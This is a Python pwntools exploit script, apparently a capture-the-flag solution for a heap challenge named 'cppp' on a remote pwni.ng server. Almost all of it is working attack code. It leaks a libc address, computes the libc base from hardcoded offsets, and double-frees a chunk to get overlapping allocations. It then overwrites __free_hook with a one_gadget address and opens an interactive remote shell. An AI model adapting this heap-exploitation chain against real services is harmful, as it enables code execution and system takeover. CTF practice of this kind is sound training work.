#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./cppp_noalarm")
p = remote("cppp.pwni.ng", 4444)


p.recvuntil("Choice: ")
wait("now")

def add(name, buf,shell=False):

    p.sendline("1")
    p.recvuntil("name: ")
    p.sendline(name)
    p.recvuntil("buf: ")
    p.sendline(buf)
    if shell == True:
        p.interactive()
    p.recvuntil("Choice: ")

def remove(idx):

    p.sendline("2")
    # will receive list if not empty before delete 
    data = p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("Choice: ")
    return data 

def view(idx):

    p.sendline("3")
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    data = p.recvuntil("Choice")
    return data 

'''
# tests

add("afang", "a"*0x48)#0
add("say2", "b"*0x48)#1

#add custom size
add("a"*0x40, "x"*1)  #2
add("a"*0x40, "x"*1)  #3
add("a"*0x40, "x"*1)  #4
add("a"*0x40, "x"*1)  #5
remove(3)
add("y", "a"*0x40) #3 
'''

for i in range(20):

    add('name%s'%str(i)+"a"*0x40, "say%s"%str(i) + 'a'*0x40) 

for i in range(20):

    add("X"*0x400, "y"*0x320)

add("a"*0x500, "b"*0x500)
remove(0)
libc = view(39)
libc_addr = libc[:6] + "\0"*2
libc_base = u64(libc_addr) - 0x3EC210 
print hex(libc_base)

#overlap

for i in range(20):

    add("a"*0x200, "b"*0x200) # 39-59 

remove(58)
remove(58)
# get back!

one = libc_base + 0x10a38c

freehook = libc_base + 0x3ed8e8 
payload1 = p64(freehook) 
payload1 = payload1.ljust(0x200, "a")
payload2 = p64(one) 
payload2 = payload2.ljust(0x100, "a")
payload3 = p64(one) 
payload3 = payload3.ljust(0x200, "a")


add(payload1, payload1)
add(payload2, payload3)
add(payload2, payload3,shell=True)
#add(payload2, payload3,shell=True)
#add(payload2, payload3,shell=True)

p.interactive()







    

    
